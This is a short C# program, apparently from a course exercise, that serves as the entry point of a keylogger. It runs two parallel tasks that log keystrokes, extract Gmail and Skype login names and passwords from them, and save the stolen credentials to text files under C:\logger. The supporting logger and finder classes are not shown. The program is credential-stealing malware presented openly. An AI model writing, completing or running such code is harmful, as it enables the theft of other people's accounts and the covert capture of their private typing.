using System;
using System.Threading.Tasks;

namespace CourseTest1
{
    class Program
    {
        static void Main(string[] args)
        {
            Task.WaitAll(
                Task.Run(() =>
                {
                    Finder gfinder = new Finder(new GmailFind());
                    gfinder.Find(new Logger(new GmailLogger(new KeyUpgrader())).Log());
                    new Writer(new FileWriter()).Write("Gmail:" + Environment.NewLine + gfinder.finder.login
                        + Environment.NewLine + gfinder.finder.password, @"C:\logger\gmaillogs.txt");
                }),
                Task.Run(() =>
                {
                    Finder sfinder = new Finder(new SkypeFind());
                    sfinder.Find(new Logger(new SkypeLogger(new KeyUpgrader())).Log());
                    new Writer(new FileWriter()).Write("Skype:" + Environment.NewLine + sfinder.finder.login
                        + Environment.NewLine + sfinder.finder.password, @"C:\logger\skypelogs.txt");
                })
            );
        }
    }
}